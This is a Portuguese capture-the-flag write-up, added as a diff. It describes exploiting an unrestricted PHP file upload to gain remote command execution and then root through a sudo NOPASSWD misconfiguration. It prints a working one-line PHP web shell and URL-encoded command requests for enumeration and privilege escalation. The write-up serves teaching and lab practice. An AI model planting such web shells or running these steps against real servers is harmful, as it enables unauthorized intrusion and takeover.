@@ -1,0 +1,79 @@
+🧩 Descrição do desafio:
+
+Desafio de Web Exploitation onde havia uma funcionalidade de upload de arquivos na página de perfil (upload.php). O objetivo era encontrar uma forma de explorar essa funcionalidade para obter execução remota de comandos (RCE) 
+e escalar privilégios até root, a fim de capturar a flag.
+
+🔎 Etapa 1 – Reconhecimento da funcionalidade de upload
+
+A funcionalidade permitia o upload de arquivos .txt, mas ao testar com arquivos .php, foi possível realizar o upload sem restrições.
+
+A URL final do upload era acessível diretamente:
+
+http://<site>/uploads/shell.php
+
+🧪 Etapa 2 – Execução remota com Web Shell
+
+Foi feito o upload de um arquivo shell.php com o seguinte conteúdo:
+
+<?php system($_GET['cmd']); ?>
+
+Ao acessar:
+
+/uploads/shell.php?cmd=whoami
+
+A resposta foi:
+
+www-data
+
+Confirmando a execução remota de comandos (RCE) com permissões do usuário do servidor web.
+
+📂 Etapa 3 – Navegação e enumeração do sistema
+
+Utilizando comandos como:
+
+/uploads/shell.php?cmd=pwd
+/uploads/shell.php?cmd=ls%20/
+
+Foi possível subir diretórios (../) e explorar o sistema até localizar a pasta /root.
+
+Entretanto, ao tentar acessá-la:
+
+/uploads/shell.php?cmd=ls%20/root
+
+A resposta foi vazia — indicando falta de permissão de leitura para o usuário www-data.
+
+🧨 Etapa 4 – Escalonamento de privilégio com SUID + Sudo
+
+Com o comando:
+
+/uploads/shell.php?cmd=find%20/%20-perm%20-u%3Ds%20-type%20f%202>%20/dev/null
+
+Foi identificado que o binário /usr/bin/sudo possuía a flag SUID ativa. Em seguida, foi executado:
+
+/uploads/shell.php?cmd=sudo%20-l
+
+A resposta foi:
+
+User www-data may run the following commands on <host>:
+    (ALL) NOPASSWD: ALL
+
+O que significava que o usuário www-data podia executar qualquer comando como root sem necessidade de senha.
+
+👑 Etapa 5 – Acesso root e captura da flag
+
+Foi executado o comando:
+
+/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
+
+E e conseguimos capturar a flag.
+
+
+✅ Resumo das técnicas usadas:
+
+    Web Shell Upload para obter RCE
+
+    Enumeração do sistema de arquivos via web shell
+
+    SUID check com find
+
+    Sudo abuse com NOPASSWD: ALL para root
